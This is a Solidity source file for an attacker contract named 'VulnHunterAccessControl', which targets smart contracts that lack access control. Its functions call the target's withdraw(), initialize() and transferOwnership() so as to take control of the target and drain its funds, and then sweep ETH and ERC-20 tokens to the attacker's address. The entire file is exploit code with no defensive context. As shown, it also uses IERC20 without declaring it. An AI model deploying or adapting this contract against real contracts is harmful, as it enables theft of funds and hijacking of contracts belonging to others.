// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnHunterAccessControl {
    address public owner;
    address public target;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    // Directly call the unprotected function
    function execute(bytes calldata data) external {
        require(msg.sender == owner);
        (bool s, bytes memory ret) = target.call(data);
        // We don't require success - some calls may revert for other reasons
        // The executor will check the return data
        emit Executed(s, ret);
    }

    // Convenience: call withdraw()
    function exploitWithdraw() external {
        require(msg.sender == owner);
        (bool s,) = target.call(abi.encodeWithSignature("withdraw()"));
        emit Executed(s, "");
    }

    // Convenience: call initialize() to take over
    function exploitInitialize() external {
        require(msg.sender == owner);
        (bool s,) = target.call(
            abi.encodeWithSignature("initialize(address)", owner)
        );
        emit Executed(s, "");
    }

    // Convenience: transferOwnership to attacker
    function exploitOwnership() external {
        require(msg.sender == owner);
        (bool s,) = target.call(
            abi.encodeWithSignature("transferOwnership(address)", owner)
        );
        emit Executed(s, "");
    }

    // Sweep
    function sweepETH() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function sweepToken(address tokenAddr) external {
        require(msg.sender == owner);
        IERC20(tokenAddr).transfer(owner, IERC20(tokenAddr).balanceOf(address(this)));
    }

    event Executed(bool success, bytes data);
}
